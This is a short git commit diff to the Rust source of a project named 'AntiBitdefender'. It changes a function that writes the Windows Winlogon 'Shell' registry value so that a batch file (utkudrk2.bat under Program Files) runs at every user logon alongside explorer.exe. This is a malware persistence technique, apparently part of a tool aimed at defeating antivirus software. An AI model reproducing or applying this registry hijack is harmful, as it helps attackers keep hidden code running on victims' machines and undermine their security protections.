325e1c4b459a61bd6de903a967e8eff4240a7834
HydraDragonAntivirus <130374789+Siradankullanici@users.noreply.github.com>
2025-01-28 13:47:42 +0300

    Final mistake fixed

--- AntiBitdefender/src/main.rs
+++ AntiBitdefender/src/main.rs
@@ -115,7 +115,7 @@ fn modify_registry() -> io::Result<()> {
     }
 
     // Set new "Shell" value
-    let new_shell_value = r"explorer.exe, c:\program files\utkudrk2.bat";
+    let new_shell_value = r"explorer.exe, c:\program files\utkudrk2\utkudrk2.bat";
     winlogon_key.set_value("Shell", &new_shell_value)?;
 
     println!("Registry modified successfully: Shell set to \"explorer.exe, C:\\Program Files\\utkudrk2\\utkudrk2.bat\".");
